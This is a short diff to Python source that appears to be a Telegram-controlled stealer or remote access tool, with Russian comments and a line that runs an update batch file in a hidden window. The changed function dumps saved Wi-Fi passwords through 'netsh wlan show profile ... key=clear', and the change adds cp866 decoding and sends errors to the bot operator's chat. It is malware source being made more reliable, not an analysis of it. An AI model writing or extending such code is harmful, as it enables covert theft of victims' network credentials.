@@ -509,9 +509,16 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
                         for i in profiles_data if 'All User Profile' in i]
 
             for profile in profiles:
-                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(
-                    'utf-8').split('\n')
 
+                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear')
+                try:
+                    profile_info = profile_info.decode('utf8').split('\n')
+                except:
+                    try:
+                        profile_info = profile_info.decode('cp866').split('\n')
+                    except Exception as e:
+                        logger.log(self.extract_wifi_passwords.__name__, e)
+                        bot.send_message(self.id, f'Ошибка: {e}')
                 try:
                     password = [i.split(':')[1].strip()
                                 for i in profile_info if 'Key Content' in i][0]
